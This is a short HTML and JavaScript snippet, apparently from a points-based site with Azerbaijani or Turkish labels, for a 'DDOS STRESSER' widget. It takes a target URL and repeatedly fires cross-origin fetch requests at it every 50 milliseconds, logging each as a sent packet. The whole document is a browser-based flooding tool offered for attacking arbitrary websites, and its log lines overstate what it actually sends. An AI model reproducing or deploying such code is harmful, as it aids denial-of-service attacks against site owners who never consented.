<div style="color:white; padding:20px; text-align:center;">
    <h3 style="color:#00ff00; font-family:'Syncopate';">DDOS STRESSER</h3>
    <input type="text" id="target-url" placeholder="https://target.com" style="width:100%; padding:15px;">
    <button onclick="startAttack()" id="at-btn" style="width:100%; margin-top:10px; background:#ff0000; color:white; border:none; padding:15px; font-weight:900;">HÜCUMU BAŞLAT (600 PTS)</button>
    <div id="logs" style="height:150px; overflow-y:auto; background:#000; font-family:monospace; margin-top:20px; padding:10px; font-size:10px; text-align:left;"></div>
</div>
<script>
let attack = false;
function startAttack() {
    const target = document.getElementById('target-url').value;
    if(!target.startsWith('http')) return alert("Tam URL yazın!");
    attack = true;
    document.getElementById('at-btn').innerText = "HÜCUM DAVAM EDİR...";
    setInterval(() => {
        if(!attack) return;
        fetch(target, { mode: 'no-cors' }).catch(e => {});
        document.getElementById('logs').innerHTML += `[SEND]: Packet sent to ${target} <br>`;
    }, 50);
}
</script>
